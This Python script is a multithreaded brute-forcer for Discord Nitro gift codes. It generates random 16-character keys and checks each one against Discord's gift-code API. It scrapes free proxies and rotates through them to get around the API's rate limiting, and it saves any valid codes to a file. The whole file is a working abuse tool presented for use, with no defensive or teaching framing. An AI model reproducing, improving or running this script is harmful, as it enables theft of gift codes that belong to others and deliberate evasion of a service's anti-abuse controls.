# It will simply loop for each thread, request the api an url with code and with the raw of the Website, we can handle what we do next :

# Changing proxy if SSL Error or Getting Rate Limited
# Generating a new key and requesting again if don't get any error but code isn't valid
# Storing in nitros.txt if you get a sweet Nitro Gift !

# Imports
import requests
import string
import random
import threading
import json
import ctypes
import os

# Colors


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Setting up
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
nums = {'total': 0, 'hits': 0}
title = 'Nitros Brute Force - by Lygaen - Tried : ' + \
    str(nums['total']) + ' | Nitros : ' + str(nums['hits'])
ctypes.windll.kernel32.SetConsoleTitleW(title)


def generate_proxies():
    print(bcolors.OKBLUE + 'Generating Socks5...')
    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all'
    r = requests.get(url, allow_redirects=True)
    open('proxies.txt', 'wb').write(r.content)
    print(bcolors.OKBLUE + 'Generated Socks5 Proxies')
    os.system('pause')
    quit()


# Check for proxies.txt file
if not os.path.isfile('proxies.txt'):

    print(bcolors.OKBLUE + "No proxies file found, ")
    print(
        bcolors.OKBLUE + "Would you like to generate the file and some proxies ? [1] Yes, both [2] No, just the file")
    try:
        reponse = int(input())
    except ValueError:
        print(bcolors.FAIL + 'Not a valid number !')
        print(bcolors.OKBLUE + 'Please give a valid reponse : 1 or 2')
        os.system('pause')
        quit()
    if reponse == 1:
        new = open('proxies.txt', 'w')
        new.close()
        generate_proxies()
    elif reponse == 2:
        new = open('proxies.txt', 'w')
        new.close()
        print(bcolors.OKGREEN + 'Created the file.')
        os.system('pause')
        quit()
    else:
        print(bcolors.FAIL + 'Please give a valid reponse : 1 or 2')
        os.system('pause')
        quit()

# Create the file nitros.txt that will contains the Sweet Nitros
if not os.path.isfile('nitros.txt'):
    new = open('nitros.txt', 'w')
    new.close()

# Generate a string with all ascii letters and digits
chars = string.ascii_letters + string.digits
random.seed = os.urandom(1024)

# Open The proxy file
proxiesRaw = open('proxies.txt', 'r')
data = proxiesRaw.read()

# Check if empty
if len(data) == 0:
    print(
        bcolors.OKBLUE + 'No proxies found in the proxies.txt file, Would you like to generate some ? [1] Yes [2] No')
    try:
        reponse = int(input())
    except ValueError:
        print(bcolors.FAIL + 'Not a valid number !')
        print(bcolors.OKBLUE + 'Please give a valid reponse : 1 or 2')
        os.system('pause')
        quit()
    if reponse == 1:
        generate_proxies()
    elif reponse == 2:
        print(bcolors.WARNING + 'Okay, aborting')
        os.system('pause')
        quit()
    else:
        print(bcolors.FAIL + 'Please give a valid reponse : 1 or 2')
        os.system('pause')
        quit()


# Split each proxy
proxies = data.split('\n')
print(bcolors.OKGREEN + 'Found ', len(proxies), ' proxies')

# Get Proxy type
print(bcolors.OKBLUE + 'What is the type of the Proxy ?')
proxyChoice = input(
    bcolors.OKBLUE + '[1] HTTP Proxies\n[2] SOCKS4 Proxies\n[3] SOCKS5 Proxies\n')
if proxyChoice != '1' and proxyChoice != '2' and proxyChoice != '3':
    print(bcolors.FAIL + 'Enter a valid number.')
    os.system('pause')
    quit()

if proxyChoice == '1':
    proxyType = 'http://'
elif proxyChoice == '2':
    proxyType = 'socks4://'
elif proxyChoice == '3':
    proxyType = 'socks5://'
input_ = input(bcolors.OKBLUE + 'Threads : ')
try:
    threads = int(input_)
except ValueError:
    print(bcolors.FAIL + 'Enter a valid number.')
    os.system('pause')
    quit()

# Get timeout
try:
    timeout = int(input(bcolors.OKBLUE + 'Timeout (in sec) : '))
except ValueError:
    print(bcolors.FAIL + 'Enter a valid number.')
    os.system('pause')
    quit()

proxyForThread = {}
retriesForThread = {}
for i in range(threads):
    proxyForThread['thread' + str(i)] = len(proxies) * i / threads

for i in range(threads):
    retriesForThread['thread' + str(i)] = 1


def genKey():  # Generate random chars
    key = ''.join(random.choice(chars) for i in range(16))
    return key


def changeProxy(threadName):
    proxyForThread[threadName] = proxyForThread[threadName] + 1


def checkKey(key, threadName):  # Get the API 'cause it's easier ;)
    url = 'https://discordapp.com/api/v6/entitlements/gift-codes/' + key
    while True:
        try:
            body = requests.get(url, proxies={'http': proxyType + proxies[int(proxyForThread[threadName])],
                                              'https': proxyType + proxies[int(proxyForThread[threadName])]},
                                timeout=timeout).json()
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout): # Checking for all erros possible
            print(bcolors.FAIL +
                  '[-] Connection timed out, changing proxy.')
            changeProxy(threadName)
            continue
        except requests.exceptions.ProxyError:
            print(bcolors.FAIL + '[-] Connection refused, changing proxy.')
            changeProxy(threadName)
            continue
        except requests.exceptions.ConnectionError:
            print(bcolors.FAIL + '[-] Connection error : retrying.')
            retriesForThread[threadName] = retriesForThread[threadName] + 1
            if retriesForThread[threadName] > 4:
                print(
                    bcolors.WARNING + '[-] Connection error : retries exceeded 4, changing proxy.')
                changeProxy(threadName)
                retriesForThread[threadName] = 0
            continue
        except json.decoder.JSONDecodeError:
            print(bcolors.FAIL + '[-] JSON decode error: retrying.')
            continue
        except (KeyError, IndexError):
            print(bcolors.WARNING + '[-] Thread reached final proxy, looping.')
            proxyForThread[threadName] = 0
            continue
        except Exception as e:
            print(e)
            print(bcolors.FAIL + '[-] SSL error : retrying.')
            retriesForThread[threadName] = retriesForThread[threadName] + 1
            if retriesForThread[threadName] > 4:
                print(bcolors.WARNING +
                      '[-] SSL error: retries exceeded 4, changing proxy.')
                changeProxy(threadName)
                retriesForThread[threadName] = 0
            continue

        retriesForThread[threadName] = 0
        break
    print(bcolors.HEADER + '[+] Cheking for key : ' + key)
    try:
        response = body['message']
    except (KeyError, IndexError):
        response = 'Code Found.'

    if response != 'Unknown Gift Code': # Checking if key is valid
        if response != 'You are being rate limited.':
            saveKey(key, body)
            print('')
            print('')
            print(bcolors.OKGREEN +
                  '[+] Hit : working nitro saved ! Here is the sweet nitro code : ', key)
            print('')
            print('')
            nums['hits'] = nums['hits'] + 1
            title = 'Nitros Brute Force - by Lygaen - Tried : ' + \
                str(nums['total']) + ' | Nitros : ' + str(nums['hits'])
            ctypes.windll.kernel32.SetConsoleTitleW(title)
            os.system('pause')
        elif response == 'You are being rate limited.':
            print(bcolors.WARNING + '[-] Rate limit detected, changing proxy.')
            changeProxy(threadName)
            checkKey(key, threadName)
    else:
        print(bcolors.BOLD + bcolors.WARNING + '[-] Miss : ', key)
    nums['total'] = nums['total'] + 1
    title = 'Nitros Brute Force - by Lygaen - Tried : ' + \
        str(nums['total']) + ' | Nitros : ' + str(nums['hits'])
    ctypes.windll.kernel32.SetConsoleTitleW(title)


def saveKey(key, json): # Save the key to a file
    try:
        product = json['store_listing']['sku']['name']
    except (KeyError, IndexError):
        product = 'Unknown'

    hits = open('nitros.txt', 'a+')
    hits.write('Sweet Nitro URL : discord.gift/' +
               key + ' | Product : ' + product + '\n')
    hits.close()


def main(): # The main runner
    for i in range(threads - 1):
        thread = threading.Thread(target=loop, args=('thread' + str(i + 1),))
        thread.daemon = False
        thread.start()

    while True:
        checkKey(genKey(), 'thread0')


def loop(threadName): # The loop for checking key etc...
    while True:
        checkKey(genKey(), threadName)


main()
